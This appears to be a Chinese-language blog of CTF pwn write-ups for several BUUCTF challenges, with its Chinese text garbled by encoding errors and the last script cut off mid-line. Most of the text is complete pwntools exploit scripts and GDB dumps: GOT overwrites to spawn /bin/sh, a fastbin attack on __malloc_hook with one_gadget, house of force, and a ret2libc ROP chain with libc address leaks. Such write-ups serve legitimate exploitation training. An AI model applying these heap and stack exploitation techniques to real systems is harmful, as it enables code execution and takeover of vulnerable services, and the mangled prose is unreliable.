å¾—åˆ°systemåœ°å€åï¼Œæ­¤æ—¶ä¿® æ”¹ç¬¬2ä¸ªuserçš„descriptionï¼Œå…¶å®æ˜¯ä¿®freeçš„GOTï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶æ”¹æˆï¼Œsystem@got.pltã€‚ æœ€ååˆ é™¤ç¬¬3ä¸ªuserï¼Œè§¦å‘system(â€˜/bin/shâ€™)ï¼Œå¾—åˆ°shell â€‹ ------ã€Šctf_all_in_oneã€‹ 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;io = process(&#x27;./babyfengshui&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)#io = remote(&quot;node3.buuoj.cn&quot;,29784)elf = ELF(&#x27;babyfengshui&#x27;)libc = ELF(&#x27;libc-2.23.so&#x27;) def add_user(size, length, text): io.sendlineafter(&quot;Action: &quot;, &#x27;0&#x27;) io.sendlineafter(&quot;description: &quot;, str(size)) io.sendlineafter(&quot;name: &quot;, &#x27;AAAA&#x27;) io.sendlineafter(&quot;length: &quot;, str(length)) io.sendlineafter(&quot;text: &quot;, text) def delete_user(idx): io.sendlineafter(&quot;Action: &quot;, &#x27;1&#x27;) io.sendlineafter(&quot;index: &quot;, str(idx)) def display_user(idx): io.sendlineafter(&quot;Action: &quot;, &#x27;2&#x27;) io.sendlineafter(&quot;index: &quot;, str(idx)) def update_desc(idx, length, text): io.sendlineafter(&quot;Action: &quot;, &#x27;3&#x27;) io.sendlineafter(&quot;index: &quot;, str(idx)) io.sendlineafter(&quot;length: &quot;, str(length)) io.sendlineafter(&quot;text: &quot;, text)def GDB(): context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;] gdb.attach(io)if __name__ == &quot;__main__&quot;: add_user(0x80, 0x80, &#x27;AAAA&#x27;) # 0 add_user(0x80, 0x80, &#x27;AAAA&#x27;) # 1 add_user(0x8, 0x8, &#x27;/bin/sh\\x00&#x27;) # 2 delete_user(0) add_user(0x100, 0x19c, &quot;A&quot;*(0x100+0x80+0x8+0x10) + p32(elf.got[&#x27;free&#x27;])) # 0 display_user(1) io.recvuntil(&quot;description: &quot;) free_addr = u32(io.recvn(4)) system_addr = free_addr - (libc.symbols[&#x27;free&#x27;] - libc.symbols[&#x27;system&#x27;]) log.info(&quot;system address: 0x%x&quot; % system_addr) update_desc(1, 0x4, p32(system_addr)) #desc-&gt;[free]&lt;-system delete_user(2) #free(*desc)--&gt;system(&quot;/bin/sh\\x00&quot;) io.interactive() babyheap_0ctf_2017 1.checksec 123456[*] &#x27;/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyheap_0ctf_2017/babyheap_0ctf_2017&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 2.IDA main 123456789101112131415161718192021222324252627282930__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(a1, a2, a3); while ( 1 ) &#123; menu(); input(); // input switch ( (unsigned __int64)off_14F4 ) &#123; case 1uLL: Allocate(v4); break; case 2uLL: Fill(v4); break; case 3uLL: Free(v4); break; case 4uLL: Dump(v4); break; case 5uLL: return 0LL; default: continue; &#125; &#125;&#125; Fill 1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf(&quot;Index: &quot;); result = input(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf(&quot;Size: &quot;); result = input(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf(&quot;Content: &quot;); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125; æ²¡æœ‰æ£€æŸ¥å †æ˜¯å¦æº¢å‡º Free 12345678910111213141516171819202122__int64 __fastcall Free(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+1Ch] [rbp-4h] printf(&quot;Index: &quot;); result = input(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; *(_DWORD *)(24LL * v2 + a1) = 0; *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL; free(*(void **)(24LL * v2 + a1 + 16)); result = 24LL * v2 + a1; *(_QWORD *)(result + 16) = 0LL; &#125; &#125; return result;&#125; æ²¡æœ‰system,leak libc + malloc_hook(æ— æ³•ä¿®æ”¹GOTè¡¨) one_gadget 1234567891011121314150x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL main_arena_offset 123[+]libc version : glibc 2.23[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a[+]main_arena_offset : 0x3c4b20 3.GDB 3.1 libc leak ä¸€èˆ¬é‡‡å–å †å—é‡å åï¼Œfree()åŠ å…¥unsorted binæœ€ådumpå‡ºunsorted binçš„åœ°å€ï¼Œæ ¹æ®libcä¸­ä¸main_arenaçš„åç§»å¾—åˆ°libc_base 123456789101112131415161718#code:Allocate(0x60)Allocate(0x30)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)) &lt;--ä¿®æ”¹idx=1çš„chunks sizeAllocate(0x100) #idx=2 &lt;--å †é‡å äº†Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71)) &lt;--idx=2çš„BK_nextsizeä½ä¿®æ”¹Free(1) &lt;--åŠ å…¥fastbiné“¾è¡¨ï¼ˆfree()çš„è¿˜æ˜¯0x30å¤§å°ï¼‰Allocate(0x60)#idx=1 &lt;--å †æº¢å‡ºFill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))&lt;--å †ä¿®å¤Allocate(0x60)#idx=3 &lt;--å’Œtop_chunkåˆ†éš”Free(2)GDB()leak = u64(Dump(1)[-25:-17])print &quot;leak:&quot;+hex(leak)base=leak-0x3c4b78malloc_hook=base+libc.sym[&#x27;__malloc_hook&#x27;]print hex(malloc_hook) 1234567gefâ¤ heap chunksChunk(addr=0x55754fefb010, size=0x70, flags=PREV_INUSE) [0x000055754fefb010 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa]Chunk(addr=0x55754fefb080, size=0x70, flags=PREV_INUSE) [0x000055754fefb080 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa]Chunk(addr=0x55754fefb0f0, size=0x70, flags=PREV_INUSE) [0x000055754fefb0f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] 1234â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Unsorted Bin for arena &#x27;main_arena&#x27; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[+] unsorted_bins[0]: fw=0x55754fefb0b0, bk=0x55754fefb0b0 â†’ Chunk(addr=0x55754fefb0c0, size=0x110, flags=PREV_INUSE)[+] Found 1 chunks in unsorted bin. 1234567891011121314151617181920212223gefâ¤ x/45gx 0x55de8a8640000x55de8a864000: 0x0000000000000000 0x00000000000000710x55de8a864010: 0x6161616161616161 0x61616161616161610x55de8a864020: 0x6161616161616161 0x61616161616161610x55de8a864030: 0x6161616161616161 0x61616161616161610x55de8a864040: 0x6161616161616161 0x61616161616161610x55de8a864050: 0x6161616161616161 0x61616161616161610x55de8a864060: 0x6161616161616161 0x61616161616161610x55de8a864070: 0x0000000000000000 0x00000000000000710x55de8a864080: 0x6161616161616161 0x61616161616161610x55de8a864090: 0x6161616161616161 0x61616161616161610x55de8a8640a0: 0x6161616161616161 0x61616161616161610x55de8a8640b0: 0x0000000000000000 0x00000000000001110x55de8a8640c0: 0x00007fa305c4ab78 0x00007fa305c4ab78 &lt;---unsorted bin0x55de8a8640d0: 0x0000000000000000 0x00000000000000000x55de8a8640e0: 0x0000000000000000 0x00000000000000710x55de8a8640f0: 0x0000000000000000 0x00000000000000000x55de8a864100: 0x0000000000000000 0x00000000000000000x55de8a864110: 0x0000000000000000 0x00000000000000000x55de8a864120: 0x0000000000000000 0x00000000000000000x55de8a864130: 0x0000000000000000 0x00000000000000000x55de8a864140: 0x0000000000000000 0x00000000000000000x55de8a864150: 0x0000000000000000 0x0000000000000000 3.2 fastbin attack æœ€åå†ä¿®æ”¹malloc_hook-35çš„åœ°å€ï¼ˆmallco_hookçš„å‚æ•°è¦åç§»ï¼Œä¸”åç§»åçš„åœ°å€ä¸èƒ½ä¸º0ï¼‰ä¸ºexec_binsh(one_gadget) ç®€è¨€ä¹‹å°±æ˜¯hook-&gt;onegadget 1234567#code:Free(1)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-35)+p64(0))GDB()#å †æº¢å‡ºè¦†ç›–chunk1çš„fd,ä½¿å¾—ä¸‹ä¸€å—chunkåœ¨malloc_hook-35çš„åœ°æ–¹Allocate(0x60)GDB() 3.4 è¦†ç›–chunk1çš„fd heap 1234567891011121314151617181920212223242526272829303132330x55a4b068b000 FASTBIN &#123; &lt;---chunk 0 prev_size = 0, size = 113, fd = 0x6161616161616161, bk = 0x6161616161616161, fd_nextsize = 0x6161616161616161, bk_nextsize = 0x6161616161616161&#125;0x55a4b068b070 FASTBIN &#123; &lt;---chunk1 prev_size = 0, size = 113, fd = 0x7f038a23caed &lt;_IO_wide_data_0+301&gt;, malloc_hook-35 bk = 0x0, fd_nextsize = 0x6161616161616161, bk_nextsize = 0x6161616161616161&#125;0x55a4b068b0e0 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55a4b068b150 &#123; prev_size = 0, size = 0, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; bins 1234567891011121314fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x7ff5da1deaed (_IO_wide_data_0+301) â—‚â€” 0xf5d9e9fe200000000x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty stack 123456789pwndbg&gt; x/gx 0x7ff5da1deb10-35 0x7ff5da1deaed &lt;_IO_wide_data_0+301&gt;: 0xf5da1dd260000000 0x7ff5da1deaf5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f 0x7ff5da1deafd: 0xf5d9e9fe20000000 0x7ff5da1deb05 &lt;__memalign_hook+5&gt;: 0xf5d9e9fa0000007f 0x7ff5da1deb0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x7ff5da1deb15 &lt;__malloc_hook+5&gt;: 0x0000000000000000 0x7ff5da1deb1d: 0x0000000000000000 0x7ff5da1deb25 &lt;main_arena+5&gt;: 0x0000000000000000 3.5 å¡«å…¥onegadget heap 12345678910111213141516171819202122232425262728293031320x55efd712d000 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x6161616161616161, bk = 0x6161616161616161, fd_nextsize = 0x6161616161616161, bk_nextsize = 0x6161616161616161&#125;0x55efd712d070 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55efd712d0e0 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55efd712d150 &#123; prev_size = 0, size = 0, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; gdb 1234567pwndbg&gt; x/gx 0x7f0f7c16ab10-350x7f0f7c16aaed &lt;_IO_wide_data_0+301&gt;: 0x0f7c169260000000 0x7f0f7c16aaf5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f0x7f0f7c16aafd: 0x41414141414141410x7f0f7c16ab05 &lt;__memalign_hook+5&gt;: 0x41414141414141410x7f0f7c16ab0d &lt;__realloc_hook+5&gt;: 0x0f7bdeb26a4141410x7f0f7c16ab15 &lt;__malloc_hook+5&gt;: 0x000000000000007f 120x7f0f7bda6000+0x4526a=0x7f0f7bdeb26a =0x7f0f7c16ab0d &lt;__realloc_hook+5&gt;çš„æ•°å€¼ 4.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.log_level = &#x27;debug&#x27;#p = remote(&quot;node3.buuoj.cn&quot;,26611)libc = ELF(&quot;./libc-2.23.so&quot;)p = process(&quot;./babyheap_0ctf_2017&quot;)def Allocate(size): p.sendlineafter(&quot;Command: &quot;,&quot;1&quot;) p.sendlineafter(&quot;Size: &quot;,str(size))def Fill(idx,content): p.sendlineafter(&quot;Command: &quot;,&quot;2&quot;) p.sendlineafter(&quot;Index: &quot;,str(idx)) p.sendlineafter(&quot;Size: &quot;,str(len(content))) p.sendlineafter(&quot;Content: &quot;,content)def Free(idx): p.sendlineafter(&quot;Command: &quot;,&quot;3&quot;) p.sendlineafter(&quot;Index: &quot;,str(idx))def Dump(idx): p.recvuntil(&quot;Command:&quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx)) p.recvuntil(&#x27;Content: \\n&#x27;) return p.recvline()def GDB(): context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;] gdb.attach(p)Allocate(0x60)Allocate(0x30)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71))Allocate(0x100)Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71))Free(1)Allocate(0x60)Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))Allocate(0x60)Free(2)print Dump(1)leak = u64(Dump(1)[-25:-17])print &quot;leak:&quot;+hex(leak)base=leak-0x3c4b78malloc_hook=base+libc.sym[&#x27;__malloc_hook&#x27;]print hex(malloc_hook)Free(1)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-35)+p64(0))Allocate(0x60)Allocate(0x60)Fill(2,&quot;A&quot;*(35-8-8)+p64(base+0x4526a))Allocate(0x10)p.interactive() bbys_tu_2016 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+14h] [ebp-Ch] puts(&quot;This program is hungry. You should feed it.&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); puts(&quot;Do you feel the flow?&quot;); return 0;&#125; printFlag 1234567891011int printFlag()&#123; char s; // [esp+1Ah] [ebp-3Eh] FILE *stream; // [esp+4Ch] [ebp-Ch] stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); fgets(&amp;s, 50, stream); puts(&amp;s); fflush(stdout); return fclose(stream);&#125; ç®€å•æ ˆæº¢å‡º 3.EXP 12345678910from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28634)elf = ELF(&quot;./bbys_tu_2016&quot;)print_flag=elf.sym[&quot;printFlag&quot;]payload = &#x27;a&#x27;*(0xc+8+4)+p32(print_flag)p.sendline(payload)print p.recv()p.interactive() bcloud_bctf_2016 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA sub_80487A1 12345678910111213141516unsigned int sub_80487A1()&#123; char s; // [esp+1Ch] [ebp-5Ch] char *v2; // [esp+5Ch] [ebp-1Ch] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); memset(&amp;s, 0, 0x50u); puts(&quot;Input your name:&quot;); safe_read((int)&amp;s, 0x40, 10); v2 = (char *)malloc(0x40u); dword_804B0CC = (int)v2; strcpy(v2, &amp;s); start_line((int)v2); return __readgsdword(0x14u) ^ v3;&#125; sçš„æœ€å¤§ä¸º0x40ï¼Œv2æœ€å¤§ä¹Ÿä¸º0x40 sub_8048779 12345int __cdecl sub_8048779(int a1)&#123; printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\\n&quot;, a1); return puts(&quot;Now let&#x27;s set synchronization options.&quot;);&#125; è¿™é‡Œå°±å¯ä»¥æ³„éœ² v2 æŒ‡é’ˆçš„åœ°å€ sub_804884E 1234567891011121314151617181920212223unsigned int sub_804884E()&#123; char s; // [esp+1Ch] [ebp-9Ch] char *v2; // [esp+5Ch] [ebp-5Ch] int v3; // [esp+60h] [ebp-58h] char *v4; // [esp+A4h] [ebp-14h] unsigned int v5; // [esp+ACh] [ebp-Ch] v5 = __readgsdword(0x14u); memset(&amp;s, 0, 0x90u); puts(&quot;Org:&quot;); safe_read((int)&amp;s, 0x40, &#x27;\\n&#x27;); puts(&quot;Host:&quot;); safe_read((int)&amp;v3, 0x40, &#x27;\\n&#x27;); v4 = (char *)malloc(0x40u); v2 = (char *)malloc(0x40u); dword_804B0C8 = (int)v2; dword_804B148 = (int)v4; strcpy(v4, (const char *)&amp;v3); strcpy(v2, &amp;s); puts(&quot;OKay! Enjoy:)&quot;); return __readgsdword(0x14u) ^ v5;&#125; å› ä¸ºè¿™é‡Œæ˜¯32ä½ç¨‹åºï¼Œè€Œä¸” s å’Œ v2 çš„æ ˆç©ºé—´ç›¸å·®64ï¼Œåˆšå¥½å¯ä»¥è¦†ç›– v2 çš„ä½åœ°ã€‚ç„¶ååˆ°è¿™ä¸€æ­¥çš„è¯ï¼Œ top chunk åˆåˆšå¥½åœ¨ v2 çš„ä¸‹æ–¹ï¼Œstrcpy(v2, &amp;s);å°†0x40ä¸ªå­—ç¬¦ + v2 åœ°å€ + v3 å†…å®¹ä¸€åŒå¤åˆ¶è¿›v2å¯ä»¥é€šè¿‡æº¢å‡ºè¦†ç›– top chunk çš„ sizeåŸŸï¼Œç¬¦åˆäº† HOF çš„ç¬¬ä¸€ä¸ªæ¡ä»¶ èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ 12345678+-------------+----+--------------------------------+| 0000009C s | s | safe_read((int)&amp;s, 0x40, &#x27;\\n&#x27;);|+---------------------------------------------------+| 0000005C | v2 | v2 = (char *)malloc(0x40u); |+---------------------------------------------------+| 00000058 | v3 |safe_read((int)&amp;v3, 0x40, &#x27;\\n&#x27;);|+---------------------------------------------------+ strcpy(v2, &amp;s); 3.æ€è·¯ åˆ©ç”¨åˆå§‹åŒ–åå­—å¤„çš„æ¼æ´æ³„æ¼å †çš„åŸºåœ°å€ã€‚ã€‚ åˆ©ç”¨ house of force å°† top chunk åˆ†é…è‡³å…¨å±€çš„ 0x0804B0A0 çš„ &amp;notesize-8 å¤„ï¼Œå½“å†æ¬¡ç”³è¯·å†…å­˜æ—¶ï¼Œä¾¿è¿”å›notesizeåœ°å€å¤„çš„å†…å­˜ï¼Œä»è€Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶æ‰€æœ‰noteçš„å¤§å°ä»¥åŠå¯¹åº”çš„åœ°å€äº†ã€‚ ä¿®æ”¹å‰ä¸‰ä¸ª note çš„å¤§å°ä¸º16ï¼Œå¹¶ä¿®æ”¹å…¶æŒ‡é’ˆä¸º free@gotï¼Œnotesizeï¼Œlibc_start å°† free@got ä¿®æ”¹ä¸º puts@pltã€‚ æ³„æ¼ libc_start åœ°å€ã€‚ å†æ¬¡ä¿®æ”¹å¦å¤–ä¸€ä¸ª free@got é¡¹ä¸º system åœ°å€ï¼Œä»è€Œæ‹¿åˆ°shellã€‚ 4.gdb 0x1 leak_addr 123450x804c000: 0x0000004900000000 0x61616161616161610x804c010: 0x6161616161616161 0x61616161616161610x804c020: 0x6161616161616161 0x61616161616161610x804c030: 0x6161616161616161 0x61616161616161610x804c040: 0x6161616161616161 0x00020f000804c008 0x00020f000804c008å‘ç°è·ç¦»åœ°å€ç›¸å·® 8ï¼Œæ‰€ä»¥ä¹‹åè¦å»å‡å» 1234567891011121314151617181920212223242526#code: sh.sendafter(&quot;Input your name:\\n&quot;,&#x27;a&#x27;*0x40) sh.recvuntil(&#x27;a&#x27;*0x40) leak = u32(sh.recv(4)) - 8 log.success(&quot;leak addr &gt; 0x%x&quot;,leak) gdb.attach(sh)#gdb0x9e89000: 0x0000004900000000 0x61616161616161610x9e89010: 0x6161616161616161 0x61616161616161610x9e89020: 0x6161616161616161 0x61616161616161610x9e89030: 0x6161616161616161 0x61616161616161610x9e89040: 0x6161616161616161 0x00020f0009e890080x9e89050: 0x0000000000000000 0x0000000000000000#gefgefâ¤ heap chunksChunk(addr=0x9e89008, size=0x48, flags=PREV_INUSE)Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Chunk(addr=0x9e89050, size=0x48, flags=PREV_INUSE)Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Chunk(addr=0x9e89098, size=0x48, flags=PREV_INUSE)Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Chunk(addr=0x9e890e0, size=0x20e70, flags=PREV_INUSE) â† top chunkÂ·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·#è®¡ç®—&gt;&gt;&gt;hex(0x9e890e0 - 0x9e89008)0xd8 #å¾—åˆ°top_chunkç›¸å¯¹åç§» 0x2 hof 12345678910111213141516171819202122232425262728#code: sh.sendafter(&quot;Org:\\n&quot;,&#x27;a&#x27;*64) sh.sendlineafter(&quot;Host:\\n&quot;,p32(0xffffffff)) log.success(&quot;top chunk &gt; 0x%x&quot;,top_chunk)#gdb0x9e89008: 0x6161616161616161 0x61616161616161610x9e89018: 0x6161616161616161 0x61616161616161610x9e89028: 0x6161616161616161 0x61616161616161610x9e89038: 0x6161616161616161 0x61616161616161610x9e89048: 0x0000004909e89008 0x00000000ffffffff0x9e89058: 0x0000000000000000 0x00000000000000000x9e89068: 0x0000000000000000 0x00000000000000000x9e89078: 0x0000000000000000 0x00000000000000000x9e89088: 0x0000000000000000 0x00000049000000000x9e89098: 0x6161616161616161 0x61616161616161610x9e890a8: 0x6161616161616161 0x61616161616161610x9e890b8: 0x6161616161616161 0x61616161616161610x9e890c8: 0x6161616161616161 0x61616161616161610x9e890d8: 0xffffffff09e89098 0x00000000000000000x9e890e8: 0x0000000000000000 0x00000000000000000x9e890f8: 0x0000000000000000 0x0000000000000000#gefgefâ¤ heap chunksChunk(addr=0x9e89008, size=0x48, flags=PREV_INUSE)Chunk(addr=0x9e89050, size=0x48, flags=PREV_INUSE)Chunk(addr=0x9e89098, size=0x48, flags=PREV_INUSE)Chunk(addr=0x9e890e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA) â† top chunk top chunk çš„ sizeåŸŸè¢«æ”¹å˜äº† 0x3 è¿ç§»top chunk 1234567891011121314151617181920#code: notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 target = notesize_addr - 8 offset = target - top_chunk - 8 log.success(&quot;offset &gt; &quot;+hex(offset)) add(offset,&quot;aaaa&quot;)#terminal[+] 1st chunk addr &gt; 0x9f8c000[+] top chunk &gt; 0x9f8c0d8[+] offset &gt; -0x1f41048#pwndbg0x804b098 PREV_INUSE &#123; prev_size = 0, size = 32772153, fd = 0xfe0befb8, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; å‘ç°å¤šäº†è¿™ä¸ª chunk ï¼Œåœ°å€=notesize_addr - 8 è¯´æ˜è¿ç§»æˆåŠŸï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡å°±ä¼šåˆ†é…chunkåˆ°è¿™é‡Œæ¥ 0x4 free@gotæ³„éœ² 12345678910#code: payload = p32(16) * 3 payload += (notelist_addr - notesize_addr - 12) * &#x27;a&#x27; payload += p32(elf.got[&#x27;free&#x27;]) + p32(elf.got[&#x27;atoi&#x27;]) * 2 add(1000,payload)#pwndbg0x804b098: 0x00000000 0x01f41039 0xfe0befb8 0x000000000x804b0a8: 0x00000000 0x00000000 0x00000000 0x000000000x804b0b8: 0x00000000 0x00000000 0x00000000 0x000000000x804b0c8: 0x09f8c098 0x09f8c008 0x00000000 0x00000000 5.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import *#context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;elf = ELF(&quot;./bcloud_bctf_2016&quot;)libc = ELF(&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;)sh = remote(&quot;node3.buuoj.cn&quot;,29429)def add(size,text): sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) sh.sendlineafter(&quot;:&quot;,str(size)) if size &gt; 0: sh.recvuntil(&quot;:&quot;) sh.send(text)def edit(idx,text): sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;) sh.sendlineafter(&quot;:&quot;,str(idx)) sh.sendafter(&quot;:&quot;,text)def delete(idx): sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;) sh.sendlineafter(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;:#------------------leak------------------ sh.sendafter(&quot;:&quot;,&quot;b&quot; * 0x40) sh.recvuntil(&quot;b&quot; * 0x40) heap_base = u32(sh.recv(4)) - 8 top_chunk = heap_base + 0xd8 log.success(&quot;1st chunk &gt; &quot;+hex(heap_base)) log.success(&quot;top chunk &gt; &quot;+hex(top_chunk))#------------------hof------------------ sh.recvuntil(&quot;:&quot;) sh.send(0x40 * &quot;a&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;\\xff&quot; * 0x4)#------------------top chunk------------------ notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 offset = notesize_addr - top_chunk - 0x10 add(offset,&#x27;&#x27;)#------free@got,atoi@got,atoi@got------ payload = p32(0x400) * 10 payload = payload.ljust(0x0804B120 - 0x0804B0A0,&#x27;\\x00&#x27;) payload += p32(elf.got[&#x27;free&#x27;]) payload += p32(notesize_addr) payload += p32(elf.got[&#x27;__libc_start_main&#x27;]) add(0x400,payload + &quot;\\n&quot;) edit(0,p32(elf.plt[&#x27;puts&#x27;]) + &quot;\\n&quot;) delete(2)#------------------leak all------------------ __libc_start_main = u32(sh.recvuntil(&#x27;\\xf7&#x27;)[-4:]) base = __libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;] system = base + libc.symbols[&#x27;system&#x27;] binsh = base + libc.search(&quot;/bin/sh\\x00&quot;).next() log.success(&#x27;libc base addr: &#x27; + hex(base)) log.success(&#x27;system addr: &#x27; + hex(system)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh))#------------------attack------------------ edit(0,p32(system) + &quot;\\n&quot;) edit(1,payload + p32(binsh) + &quot;\\n&quot;) delete(3) sh.interactive() bjdctf_2020_babyrop 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA vuln 1234567ssize_t vuln()&#123; char buf; // [rsp+0h] [rbp-20h] puts(&quot;Pull up your sword and tell me u story!&quot;); return read(0, &amp;buf, 0x64uLL);&#125; æº¢å‡º+libc leak 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *#from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29594)elf = ELF(&quot;./bjdctf_2020_babyrop&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)puts_plt = elf.plt[&quot;puts&quot;]read_got = elf.got[&quot;read&quot;]main_addr = elf.sym[&quot;main&quot;]pop_rdi_ret = 0x0000000000400733payload = &quot;a&quot;*(0x20+8)payload += p64(pop_rdi_ret)+p64(read_got)payload += p64(puts_plt)+p64(main_addr)p.recvuntil(&quot;story!\\n&quot;)p.sendline(payload)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))#leak_addr = u64(p.recv(0x6))libc_base = leak_addr-libc.sym[&quot;read&quot;]sys_addr = libc_base+libc.sym[&quot;system&quot;]binsh = libc_base+libc.search(&quot;/bin/sh&quot;).next()&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr-libc.dump(&quot;read&quot;)sys_addr = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)&#x27;&#x27;&#x27;log.info(&quot;libc base=&gt;%x&quot;,libc_base)log.info(&quot;system 